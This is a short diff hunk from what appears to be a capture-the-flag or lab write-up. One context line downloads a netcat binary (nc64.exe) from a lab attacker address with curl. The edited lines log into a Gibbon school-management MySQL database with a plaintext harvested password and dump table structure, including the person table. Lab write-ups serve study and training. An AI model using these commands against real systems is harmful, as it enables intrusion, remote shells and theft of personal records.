@@ -13,7 +13,7 @@ curl 10.10.17.95/nc64.exe -o nc64.exe
 ```
 
 ```
-.\mysql.exe -u 'MrGibbonsDB' -pMisterGibbs!Parrot!?1 -h 127.0.0.1
+mysql.exe -uMrGibbonsDB -p"MisterGibbs!Parrot!?1" gibbon -e "show TABLES;DESCRIBE gibbonperson;"
 ```
 
 ```
